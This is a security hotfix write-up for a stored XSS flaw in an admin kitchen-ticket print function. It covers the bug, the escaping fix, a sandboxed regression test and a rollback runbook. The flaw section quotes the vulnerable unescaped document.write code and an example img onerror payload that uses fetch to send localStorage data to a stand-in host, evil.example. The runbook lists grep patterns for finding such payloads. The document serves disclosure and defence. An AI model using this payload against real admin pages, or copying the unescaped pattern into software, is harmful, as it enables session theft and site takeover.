# Hotfix — Admin kitchen-ticket stored XSS (print path)

**Date:** 2026-08-29
**Severity:** High — script execution in the Admin (admin.html) same-origin context.
**Builds:** Admin 358 → **359**, service-worker cache `accaza-v283` → **`accaza-v284`**.
**Deployment surface:** GitHub Pages static files only. **No Cloud Functions, rules, or
database changes** — `functions/index.js`, `database.rules.json`, `storage.rules` are untouched.

## Vulnerability

`assets/js/admin/core.mjs` → `window.printOrder(orderId)` built the kitchen ticket by string
concatenation and injected it into a same-origin popup with `win.document.write()`:

```js
var notesRow = o.notes ? '... <span>' + o.notes + '</span> ...' : '';
var win = window.open('', '_blank', 'width=440,height=640');
win.document.write(ticketHtml);
```

Server-side, `functions/index.js` → `textField()` only trims and length-checks order text, so
the five customer-supplied fields — **name, phone, contact, address, notes** (plus staff-editable
items/date/time/onDuty/payment) — reached the printer verbatim. No CSP is configured on GitHub
Pages, so a malicious order note such as
`<img src=x onerror="fetch('https://evil.example/'+localStorage.k)">` executed with **Admin
origin privileges** the moment a cashier pressed Print on that order.

## Fix

`escHtml` was already imported in `core.mjs` from `shared-ui.mjs`. All **ten** customer-facing
interpolations inside `printOrder` are now wrapped:

| # | Field | Escape |
|---|-------|--------|
| 1 | items (each comma-split part) | `escHtml(s.trim())` |
| 2 | address | `escHtml(o.address)` |
| 3 | date | `escHtml(o.date\|\|'')` |
| 4 | time | `escHtml(o.time\|\|'')` |
| 5 | notes | `escHtml(o.notes)` |
| 6 | name | `escHtml(o.name\|\|'—')` |
| 7 | phone | `escHtml(o.phone\|\|'—')` |
| 8 | contact | `escHtml(o.contact)` |
| 9 | onDuty / staff | `escHtml(o.onDuty\|\|o.staff\|\|'—')` |
| 10 | payment | `escHtml(o.payment\|\|'—')` |

Deliberately **not** wrapped: `o.id` (server-generated order id) and `o.total`
(`(o.total||0).toLocaleString()` — numeric). `printTime` is locally generated.

### Version bumps (Admin build 359)

| File | Change |
|------|--------|
| `admin.html` | `<meta name="accaza-admin-build" content="359">`, visible badge `build&nbsp;v359`, `module-loader.js?v=359` |
| `sw.js` | `const CACHE='accaza-v284'` (forces the poisoned 358 ticket HTML out of every cache) |
| `release-manifest.json` | `builds.admin: 359`, `builds.serviceWorkerCache: 284` |

`core.mjs?v=332` / `overview-insights.mjs?v=332` remain pinned (quality-gate requirement).

## Regression test

`tests/static-check.mjs` now ships an executable check that:

1. Extracts the **shipped** `window.printOrder` from `core.mjs` by string/comment-aware
   brace matching (the CSS block contains braces inside string literals).
2. Runs it in a `node:vm` sandbox together with the **real** `escHtml` from
   `assets/js/admin/shared-ui.mjs`, against a poisoned order where every customer field
   carries `<img src=x onerror="window.__ticketPwn(1)">`.
3. Parses both the poisoned and a clean ticket with a minimal HTML tokenizer and asserts:
   - no raw `<img>` element in the ticket DOM,
   - no `onerror` (or any `on*`) attribute on any element,
   - the poisoned ticket's element structure is **identical** to a clean order's ticket,
   - the payload survives as decoded **text** (data preserved, markup inert).

Confirmed failing before the fix (`kitchen-ticket print path injected a raw <img> element
from order data`) and passing after. `npm test` now reports **24 PASS**.

## Rollback procedure

Rollback triggers: any failure of `npm test`, `npm run test:release`, or
`npm run test:safety` on `main`, broken admin login, blank/garbled kitchen tickets, or a
regression in order printing after this hotfix ships. This hotfix only touches static,
client-side files, so rollback is a static redeploy — **no database or Functions rollback
is required, and no data migration was performed** (the fix is display-only; stored order
data is untouched).

1. **Freeze and assess (≤ 5 min).** In the Admin portal, check whether tickets still print
   (rows, items, totals readable). If printing itself is broken in build 359, continue;
   if only cosmetics are wrong, prefer a forward-fix patch — the XSS must **not** be
   reintroduced.
2. **Revert on main.**
   ```bash
   git checkout main
   git pull --ff-only origin main
   git revert -m 1 <merge-commit-of-hotfix-PR>   # or git revert <squash-commit>
   git push origin main
   ```
   GitHub Pages redeploys from `main` automatically (typically 2–5 minutes).
   ⚠️ Reverting restores the **vulnerable** build 358 print path. Only do this for a
   print-breaking defect, and treat the revert as a stopgap: re-land an escaped
   version promptly. If the defect is in escaping behavior itself (e.g. a field renders
   as `&amp;`-style entities), prefer reverting just the offending wrap or hotfixing
   forward rather than the whole revert.
3. **Bust the service-worker cache after any rollback/forward-fix.** Every deploy that
   must replace cached static assets needs a cache bump: restore/raise
   `sw.js → const CACHE='accaza-v285'` (never reuse a live version), and keep
   `release-manifest.json → builds.admin` and `builds.serviceWorkerCache` in sync with
   `admin.html` (`accaza-admin-build` meta, visible badge, `module-loader.js?v=`) or
   `npm run test:release` / `npm test` will fail. This is the same five-place bump
   procedure used to ship this hotfix.
4. **Verify the rollback.**
   - `npm ci && (cd functions && npm ci) && npm test` → 24 PASS,
     `npm run test:release` → PASS, `npm run test:safety` → PASS.
   - Hard-refresh the Admin portal (`Ctrl+Shift+R`), confirm the header badge shows the
     expected build, then DevTools → Application → Service Workers: confirm the new SW
     is `activated`. Print one order end-to-end (pick-up and delivery) and confirm the
     ticket renders correctly.
   - Watch System Health / telemetry for the new admin build stamp.
5. **Communicate.** Record the trigger, decision, and evidence (screenshots of a printed
   ticket, gate output, build stamps) in the operations log, per
   `OPERATIONS_RELEASE_RUNBOOK.md` → "Rollback decision". Never hide a rollback.
6. **Post-incident (mandatory for the XSS).** Because the pre-359 path allowed script in
   the Admin origin, review `/orders` (and archived orders) created before the fix for
   suspicious `name`, `phone`, `contact`, `address`, `notes`, or `items` values
   (grep for `<img`, `<script`, `onerror`, `javascript:`). Rotate Admin credentials and
   review the Firebase Auth user list / `/admins` role assignments for unknown accounts
   if any poisoned order is found. Note that reverting (step 2) re-opens this exposure —
   another reason a revert must be short-lived.
